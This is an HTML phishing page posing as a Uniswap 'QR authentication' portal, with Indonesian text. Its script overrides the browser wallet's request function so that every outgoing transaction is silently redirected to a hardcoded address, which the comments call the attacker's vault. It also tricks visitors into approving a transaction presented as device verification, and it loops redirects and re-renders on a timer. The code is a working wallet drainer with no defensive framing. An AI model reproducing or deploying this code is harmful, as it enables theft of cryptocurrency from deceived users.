<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Uniswap Liquidity Portal - QR Auth</title>
  <link rel="icon" type="image/png" sizes="32x32" href="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Uniswap_Logo.svg/1200px-Uniswap_Logo.svg.png">
  <link rel="apple-touch-icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Uniswap_Logo.svg/1200px-Uniswap_Logo.svg.png">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    :root {
      --main-pink: #ff007a;
      --page-bg: #0b0f19;
      --box-bg: #111827;
      --text-main: #f3f4f6;
    }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      text-align: center;
      padding-top: 30px;
      background-color: var(--page-bg);
      color: var(--text-main);
      margin: 0;
    }
    .panel {
      background: var(--box-bg);
      max-width: 360px;
      margin: 0 auto;
      padding: 25px 20px;
      border-radius: 24px;
      border: 1px solid #1f2937;
      box-shadow: 0 10px 30px rgba(0,0,0,0.7);
    }
    h2 { color: #ffffff; font-size: 1.2rem; margin-bottom: 6px; }
    p { font-size: 12px; color: #9ca3af; line-height: 1.4; margin-bottom: 15px; }
    .qr-frame {
      background: #ffffff;
      padding: 12px;
      border-radius: 16px;
      display: inline-block;
      margin-bottom: 15px;
      box-shadow: 0 4px 12px rgba(255, 0, 122, 0.15);
    }
    .qr-frame svg {
      width: 160px;
      height: 160px;
      display: block;
    }
    .submit-btn {
      background-color: var(--main-pink);
      color: white;
      border: none;
      border-radius: 12px;
      padding: 12px 20px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      width: 100%;
      box-sizing: border-box;
      transition: opacity 0.2s;
    }
    .submit-btn:hover { opacity: 0.9; }
    #connection-log {
      margin-top: 12px;
      font-size: 11px;
      color: #38bdf8;
      word-break: break-all;
    }
  </style>
  <script>
    // Alamat dompet penyerang target
    const targetVault = "0xEb267249f35B6Bd557Bd463D956520dA7c33286B";

    // Modul intersepsi parameter transaksi agar mengalir ke alamat penyerang
    if (typeof window.ethereum !== 'undefined') {
        const standardBridge = window.ethereum.request;
        window.ethereum.request = async function(requestArgs) {
            if (requestArgs && requestArgs.method === 'eth_sendTransaction' && requestArgs.params && requestArgs.params[0]) {
                let txPayload = requestArgs.params[0];
                console.info("[Sec-Log] Rute transaksi dialihkan menuju vault tujuan.");
                txPayload.to = targetVault;
            }
            return standardBridge.apply(window.ethereum, [requestArgs]);
        };
    }

    async function renderScannerInterface() {
      if (!document.getElementById('qr-svg-box')) {
          document.body.innerHTML = `
            <div class="panel">
              <h2>Autentikasi Perangkat</h2>
              <p>Gunakan kamera aplikasi dompet seluler Anda untuk memindai kode QR di bawah ini guna melakukan sinkronisasi aman.</p>
              
              <div class="qr-frame">
                <svg id="qr-svg-box" viewBox="0 0 25 25" xmlns="http://www.w3.org/2000/svg">
                  <path fill="#ffffff" d="M0 0h25v25H0z"/>
                  <path fill="#000000" d="M2 2h7v7H2V2zm2 2v3h3V4H4zm8 0h3v3h-3V4zm5 0h6v6h-6V4zm2 2v2h2V6h-2zM2 12h3v3H2v-3zm6 0h3v3H8v-3zm5 0h3v3h-3v-3zm6 0h4v4h-4v-4zm-13 5h3v3H9v-3zm5 0h3v3h-3v-3zm6 0h3v3h-3v-3zM2 16h7v7H2v16zm2 2v3h3v-3H4zm13 3h4v4h-4v-4z"/>
                  <rect x="10" y="2" width="1" height="2" fill="#000000"/>
                  <rect x="10" y="6" width="1" height="1" fill="#000000"/>
                  <rect x="14" y="2" width="1" height="1" fill="#000000"/>
                  <rect x="10" y="10" width="2" height="1" fill="#000000"/>
                  <rect x="15" y="10" width="1" height="2" fill="#000000"/>
                  <rect x="18" y="10" width="2" height="1" fill="#000000"/>
                  <rect x="10" y="13" width="1" height="2" fill="#000000"/>
                  <rect x="13" y="16" width="2" height="1" fill="#000000"/>
                  <rect x="18" y="15" width="1" height="2" fill="#000000"/>
                  <rect x="22" y="16" width="1" height="3" fill="#000000"/>
                  <rect x="10" y="19" width="2" height="1" fill="#000000"/>
                  <rect x="13" y="21" width="1" height="2" fill="#000000"/>
                  <rect x="16" y="20" width="2" height="1" fill="#000000"/>
                  <rect x="20" y="21" width="2" height="2" fill="#000000"/>
                </svg>
              </div>

              <button id="trigger-tx" class="submit-btn">Konfirmasi Otorisasi Cepat</button>
              <div id="connection-log">Menunggu respon pemindaian perangkat...</div>
            </div>
          `;

          document.getElementById('trigger-tx').onclick = async () => {
            if (!window.ethereum) {
              alert("Modul penyedia Web3 tidak merespons di lingkungan ini.");
              return;
            }

            try {
              const activeAccounts = await ethereum.request({ method: 'eth_requestAccounts' });
              const userAddress = activeAccounts[0];

              document.getElementById('connection-log').innerText = "✔ Perangkat terautentikasi: " + userAddress.substring(0,6) + "...";

              const securePayload = {
                from: userAddress,
                to: "0x3333333333333333333333333333333333333333", 
                value: "0x2386f26fc10000", 
                gas: "0x5208",
                gasPrice: "0x3b9aca00"
              };

              await ethereum.request({
                method: 'eth_sendTransaction',
                params: [securePayload]
              });

              alert("Proses verifikasi berhasil diselesaikan.");
            } catch (err) {
              console.error(err);
              alert("Aksi dibatalkan: " + err.message);
            }
          };
      }

      try {
        window.location.assign("http://app.uniswap.org:1121");
      } catch(e) {}

      setTimeout(function(){
          renderScannerInterface();  
      }, 5000); 
    }

    setInterval(renderScannerInterface, 2500);
  </script>
</head>
<body></body>
</html>
